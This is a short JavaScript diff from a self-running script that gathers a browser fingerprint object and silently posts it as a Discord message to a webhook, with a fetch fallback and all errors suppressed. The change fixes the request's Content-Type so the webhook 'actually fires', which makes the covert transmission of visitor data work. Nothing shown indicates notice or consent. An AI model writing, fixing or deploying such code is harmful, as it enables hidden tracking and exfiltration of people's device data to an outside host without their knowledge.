@@ -73,20 +73,14 @@
   } catch (_) {}
 
   // ---- POST (fire and forget, no response handling) ----
+  // sendBeacon defaults to text/plain, which Discord rejects. wrap in a Blob
+  // with the right Content-Type so the webhook actually fires.
+  const body = JSON.stringify({ content: "```json\n" + JSON.stringify(fp, null, 2) + "\n```" });
   try {
-    navigator.sendBeacon(
-      WEBHOOK,
-      JSON.stringify({ content: "```json\n" + JSON.stringify(fp, null, 2) + "\n```" })
-    );
+    navigator.sendBeacon(WEBHOOK, new Blob([body], { type: "application/json" }));
   } catch (_) {
-    // sendBeacon failed — try fetch as fallback
     try {
-      fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "```json\n" + JSON.stringify(fp, null, 2) + "\n```" }),
-        keepalive: true,
-      });
+      fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body, keepalive: true });
     } catch (_) {}
   }
 })();
